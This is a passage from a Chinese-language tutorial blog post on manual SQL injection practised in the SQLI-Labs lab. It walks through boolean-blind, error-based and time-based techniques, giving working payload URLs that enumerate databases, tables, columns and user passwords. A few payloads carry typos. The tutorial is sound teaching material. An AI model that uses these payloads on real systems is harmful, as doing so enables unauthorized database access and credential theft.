limit\n0,1),1,1))=68,sleep(5),1)--+\n```\n\n![bool52](/images/sqlall/bool52.jpg)\n\n其他字段信息请自行搭建环境测试,\n","slug":"SQL注入全解","published":1,"updated":"2020-10-23T04:37:29.335Z","_id":"ckglobheb0012b1hq9gcy2pdl","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Tip: 这篇将详细介绍盲注/报错/时间延迟注入等三种注入,并在测试环境SQLI-Labs中实现注入;这里说下,<a href=\"https://github.com/Audi-1/sqli-labs\">SQLI-Labs</a>相比大家都知道其内部实验主要关注SQL注入,且分类众多,对于想学习手工注入、SQL注入可以本地搭建环境进行测试.</p>\n<table>\n<thead>\n<tr>\n<th>一、布尔盲注</th>\n<th>二、报错注入</th>\n<th>三、时间盲注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>left()函数</td>\n<td>count()&amp;floor(rand())&amp;group by</td>\n<td>sleep()函数</td>\n</tr>\n<tr>\n<td>ascii()和substr函数</td>\n<td>EXP()函数</td>\n<td>if(condition,true,false)</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>ord()函数&amp;mid()函数</td>\n<td>bigint溢出</td>\n<td></td>\n</tr>\n<tr>\n<td>regexp正则</td>\n<td>xpath报错注入:extractvalue()、updataxml()</td>\n<td></td>\n</tr>\n</tbody></table>\n<h1 id=\"一、布尔盲注\"><a href=\"#一、布尔盲注\" class=\"headerlink\" title=\"一、布尔盲注\"></a>一、布尔盲注</h1><h2 id=\"1-1-left\"><a href=\"#1-1-left\" class=\"headerlink\" title=\"1.1.left()\"></a>1.1.left()</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">格式:left(str,1)&gt;5</span><br></pre></td></tr></table></figure>\n<p>解析:str是字符串,可能是版本号,可能是数据库名等;数字1:指的是从字符串中获取第一个字符,如果想获取第二个字符,直接修改次数字就行,但,注意:后面比较的数字要写上我们探测的第一个字符信息.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">示例:</span><br><span class=\"line\">Database()=<span class=\"string\">&#x27;security&#x27;</span>实际值;</span><br><span class=\"line\">Left(database(),1)&gt;<span class=\"string\">&#x27;s&#x27;</span> 没有爆错并测出第一个字符是<span class=\"string\">&#x27;s&#x27;</span></span><br><span class=\"line\">Left(database(),2)&gt;<span class=\"string\">&#x27;sh&#x27;</span> 需要加第一个字符,否则会爆错的;注意啦啦啦;</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-1-1-爆库\"><a href=\"#1-1-1-爆库\" class=\"headerlink\" title=\"1.1.1.爆库\"></a>1.1.1.爆库</h3><p>1.1.1.1.猜测第一个字符</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:猜测第一个字符是否大于<span class=\"string\">&#x27;i&#x27;</span>字符</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left(database(),1)&gt;&#x27;i&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/sqlall/bool1.jpg\" alt=\"bool1\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:确定第一个字符是s</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left(database(),1)=&#x27;s&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<p>1.1.1.2.猜解第二个字符</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:必须添加第一个字符,以便进行猜解第二个字符;</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left(database(),2)=&#x27;se&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:没有第九个字符,会直接报错,如下面URL.</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left(database(),9)&gt;&#x27;securitya&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"1-1-2-爆库\"><a href=\"#1-1-2-爆库\" class=\"headerlink\" title=\"1.1.2.爆库\"></a>1.1.2.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select schema_name from information_schema.schemata limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),1)=&#x27;i&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/sqlall/bool2.jpg\" alt=\"bool2\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select schema_name from information_schema.schemata limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),12)=&#x27;information_&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/sqlall/bool3.jpg\" alt=\"bool3\"></p>\n<p>1.1.2.1.第一张表</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 0,1),1)=&#x27;e&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool4.jpg\" alt=\"bool4\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 0,1),3)=‘ema’--+</span></span><br></pre></td></tr></table></figure>\n\n<p>1.1.2.2.第二张表</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 1,1),1)=&#x27;r&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool5.jpg\" alt=\"bool5\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 1,1),2)=&#x27;re&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p>其他测试可自行继续猜解其他表,其中包含:users等表,具体不作实操;</p>\n<h3 id=\"1-1-3-爆表\"><a href=\"#1-1-3-爆表\" class=\"headerlink\" title=\"1.1.3.爆表\"></a>1.1.3.爆表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select column_name from information_schema.columns where</span></span><br><span class=\"line\"><span class=\"string\">table_name=&#x27;users&#x27; limit 0,1),1)=&#x27;i&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool6.jpg\" alt=\"bool6\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select column_name from information_schema.columns where</span></span><br><span class=\"line\"><span class=\"string\">table_name=&#x27;users&#x27; limit 0,1),2)=&#x27;id&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p>其他字段名:id、username、password</p>\n<h3 id=\"1-1-4-爆数据\"><a href=\"#1-1-4-爆数据\" class=\"headerlink\" title=\"1.1.4.爆数据\"></a>1.1.4.爆数据</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:注意:第一个username是D,大写字符,但是这里无法区分大小写;</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select username from security.users limit 0,1),1)=&#x27;d&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool7.jpg\" alt=\"bool7\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select username from security.users limit 0,1),2)=&#x27;du&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p>建议:这里不要使用此函数进行猜解,因为无法判断字符哪里是大写哪里是小写的字符;建议使用下面ascii码来判断字符信息;其他部分就不继续猜解,因为字符中存在大小写区分.</p>\n<h2 id=\"1-2-ascii-amp-substr\"><a href=\"#1-2-ascii-amp-substr\" class=\"headerlink\" title=\"1.2.ascii()&amp;substr()\"></a>1.2.ascii()&amp;substr()</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">格式:</span><br><span class=\"line\">ascii(string)&gt;ascii码           ascii转换作用,并与外部进行比较;</span><br><span class=\"line\">substr(string,start,length)  从字符串开始的数字,取出长度为length长度的字符;</span><br></pre></td></tr></table></figure>\n\n<p>下面就利用此paylaod进行获取库中表名:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ascii(substr((select table_name from information_schema.tables <span class=\"built_in\">where</span> tables_schema=database() <span class=\"built_in\">limit</span> 0,1),1,1))=101</span><br><span class=\"line\">//注意：database()已经通过以上方式可以获得;</span><br></pre></td></tr></table></figure>\n\n<p>ASCII码对照表:<a href=\"http://ascii.911cha.com/\">http://ascii.911cha.com/</a></p>\n<h3 id=\"1-2-1-爆库\"><a href=\"#1-2-1-爆库\" class=\"headerlink\" title=\"1.2.1.爆库\"></a>1.2.1.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select database()),1,1))=115 --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool8.jpg\" alt=\"bool8\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:101—&gt;<span class=\"string\">&#x27;e&#x27;</span></span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select database()),2,1))=101 --+</span></span><br></pre></td></tr></table></figure>\n\n<p>注意:超出字符长度时,设置最小ascii字符,也会报错,说明字符已经猜解完毕</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select database()),9,1))&gt;65 --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-2-2-爆表\"><a href=\"#1-2-2-爆表\" class=\"headerlink\" title=\"1.2.2.爆表\"></a>1.2.2.爆表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:101—&gt;<span class=\"string\">&#x27;e&#x27;</span></span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 0,1),1,1))=101 --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool9.jpg\" alt=\"bool9\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 0,1),2,1))=109 --+</span></span><br></pre></td></tr></table></figure>\n\n<p>和上面一样修改部分数字即可;表名:users、emails等:</p>\n<h3 id=\"1-2-3-爆字段\"><a href=\"#1-2-3-爆字段\" class=\"headerlink\" title=\"1.2.3.爆字段\"></a>1.2.3.爆字段</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select column_name from information_schema.columns where</span></span><br><span class=\"line\"><span class=\"string\">table_name=&#x27;users&#x27; limit 0,1),1,1))=105 --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool10.jpg\" alt=\"bool10\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select column_name from information_schema.columns where</span></span><br><span class=\"line\"><span class=\"string\">table_name=&#x27;users&#x27; limit 0,1),2,1))=100 --+</span></span><br></pre></td></tr></table></figure>\n\n<p>其他部分不作测试,列名:id、admin、username、password等,我们主要以username和password两列为主;</p>\n<h2 id=\"1-3-ord-amp-mid\"><a href=\"#1-3-ord-amp-mid\" class=\"headerlink\" title=\"1.3.ord()&amp;mid()\"></a>1.3.ord()&amp;mid()</h2><p>通过以上布尔型盲注后可以获取数据库、表和字段名等信息;其实ord和mid函数的作用和上面我们说的ascii和substr函数一致.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">格式:</span><br><span class=\"line\">ord(string)     对获取的字符进行ascii码转换;</span><br><span class=\"line\">mid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1)    截取字段中第一行的第一个字符;</span><br><span class=\"line\">mid(column_name,start[,length])</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-3-1-爆库\"><a href=\"#1-3-1-爆库\" class=\"headerlink\" title=\"1.3.1.爆库\"></a>1.3.1.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:第一个字符的ASCII码</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ord(mid((select database()),1,1))=115--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool12.jpg\" alt=\"bool12\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ord(mid((select database()),2,1))=101--+</span></span><br></pre></td></tr></table></figure>\n\n<p>后续的注入语句可以参考上面.</p>\n<h2 id=\"1-4-regexp正则\"><a href=\"#1-4-regexp正则\" class=\"headerlink\" title=\"1.4.regexp正则\"></a>1.4.regexp正则</h2><p>通过上面方法我们已经获取数据库和表,此时就是获取字段信息;而,正则表达式法,主要是利用布尔型进行模糊匹配.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">格式:regexp <span class=\"string\">&#x27;^…&#x27;</span></span><br><span class=\"line\">regexp ‘^…<span class=\"string\">&#x27;  and 1=(select 1 from information_schema.columns where table_name=&#x27;</span>users<span class=\"string\">&#x27; and column_name regexp &#x27;</span>^us[a-z]<span class=\"string\">&#x27; limit 0,1)</span></span><br><span class=\"line\"><span class=\"string\">--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-4-1-爆库\"><a href=\"#1-4-1-爆库\" class=\"headerlink\" title=\"1.4.1.爆库\"></a>1.4.1.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and 1=(select 1 and database() regexp &#x27;^[a-z]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool13.jpg\" alt=\"bool13\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and 1=(select 1 and database() regexp &#x27;^[s-s]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-4-2-爆表\"><a href=\"#1-4-2-爆表\" class=\"headerlink\" title=\"1.4.2.爆表\"></a>1.4.2.爆表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and</span></span><br><span class=\"line\"><span class=\"string\">table_name regexp &#x27;^[a-s]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool14.jpg\" alt=\"bool14\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and</span></span><br><span class=\"line\"><span class=\"string\">table_name regexp &#x27;^[e-e]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-4-3-爆字段\"><a href=\"#1-4-3-爆字段\" class=\"headerlink\" title=\"1.4.3.爆字段\"></a>1.4.3.爆字段</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and</span></span><br><span class=\"line\"><span class=\"string\">column_name regexp &#x27;^[a-z]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>\n\n<p>其他部分请自行继续.</p>\n<h1 id=\"二、报错注入\"><a href=\"#二、报错注入\" class=\"headerlink\" title=\"二、报错注入\"></a>二、报错注入</h1><h2 id=\"2-1-count-amp-floor-amp-group-by\"><a href=\"#2-1-count-amp-floor-amp-group-by\" class=\"headerlink\" title=\"2.1.count&amp;floor&amp;group by\"></a>2.1.count&amp;floor&amp;group by</h2><p>count(*)、floor(rand(0)*2)和group by的报错原理已经进行分析,可以参考后续:《Mysql注入之报错注入学习与分析-&gt;floor、count、group by》具体的语句构造可以参考下面的方式进行..这里省略了注入判断部分.</p>\n<h3 id=\"2-1-0-数据库\"><a href=\"#2-1-0-数据库\" class=\"headerlink\" title=\"2.1.0.数据库\"></a>2.1.0.数据库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select user()),0x3a,floor(rand(0)*2))a from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool15.jpg\" alt=\"bool15\"></p>\n<h3 id=\"2-1-1-爆库\"><a href=\"#2-1-1-爆库\" class=\"headerlink\" title=\"2.1.1.爆库\"></a>2.1.1.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select schema_name from </span></span><br><span class=\"line\"><span class=\"string\">information_schema.schemata limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool16.jpg\" alt=\"bool16\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select schema_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.schemata limit 6,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-2-爆表\"><a href=\"#2-1-2-爆表\" class=\"headerlink\" title=\"2.1.2.爆表\"></a>2.1.2.爆表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select table_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x3a,floor(rand(0)*2))a from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool17.jpg\" alt=\"bool17\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select table_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x3a,floor(rand(0)*2))a from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-3-爆字段\"><a href=\"#2-1-3-爆字段\" class=\"headerlink\" title=\"2.1.3.爆字段\"></a>2.1.3.爆字段</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select column_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns</span></span><br><span class=\"line\"><span class=\"string\">group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool18.jpg\" alt=\"bool18\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select column_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),0x3a,floor(rand(0)*2))a from information_schema.columns</span></span><br><span class=\"line\"><span class=\"string\">group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-4-爆数据\"><a href=\"#2-1-4-爆数据\" class=\"headerlink\" title=\"2.1.4.爆数据\"></a>2.1.4.爆数据</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:这里payload只能爆出一列字段信息</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,scount(*),concat(0x3a,(select username from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool19.jpg\" alt=\"bool19\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select password from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-EXP-报错\"><a href=\"#2-2-EXP-报错\" class=\"headerlink\" title=\"2.2.EXP()报错\"></a>2.2.EXP()报错</h2><p>EXP(x) 返回值e（自然对数的底）的x次方;如果不懂的,可以看这篇文章:《Mysql注入之exp报错注入》</p>\n<p>URL：备注：使用EXP函数进行报错时，必须得知列长，如：这里是id、username、password三列</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT USER())a))),2,3--+\t</span></span><br></pre></td></tr></table></figure>\n\n<p><img 